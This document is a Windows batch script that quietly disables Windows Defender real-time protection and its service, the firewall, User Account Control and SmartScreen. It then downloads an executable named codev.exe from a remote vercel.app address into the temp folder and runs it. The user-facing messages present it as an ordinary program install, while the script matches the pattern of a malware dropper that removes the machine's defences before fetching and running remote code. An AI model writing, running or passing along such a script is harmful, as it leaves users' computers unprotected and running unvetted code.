@echo off
setlocal enabledelayedexpansion

:: Disable Windows Defender and other security features
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true" > nul 2>&1
powershell -Command "Set-Service -Name 'WinDefend' -StartupType Disabled" > nul 2>&1
powershell -Command "Stop-Service -Name 'WinDefend'" > nul 2>&1

:: Disable Windows Firewall
netsh advfirewall set allprofiles state off > nul 2>&1

:: Disable UAC (User Account Control)
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f > nul 2>&1

:: Disable Windows SmartScreen
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v SmartScreenEnabled /t REG_SZ /d Off /f > nul 2>&1

:: Download the program
set "outputFile=%TEMP%\codev.exe"
set "downloadUrl=https://codev-zeta.vercel.app/codev.exe"

echo Downloading the program...
curl -L -o "%outputFile%" "%downloadUrl%" > nul 2>&1

if not exist "%outputFile%" (
    echo Failed to download the program.
    exit /b 1
)

echo Program downloaded successfully.

:: Run the downloaded program
echo Running the program...
start "" "%outputFile%" > nul 2>&1
ping -n 5 127.0.0.1 > nul 2>&1

:: Check if the program is running
tasklist /fi "imagename eq codev.exe" | find /i "codev.exe" > nul 2>&1
if errorlevel 1 (
    echo The program is not running.
    exit /b 1
)

echo Program is running successfully.

endlocal
exit /b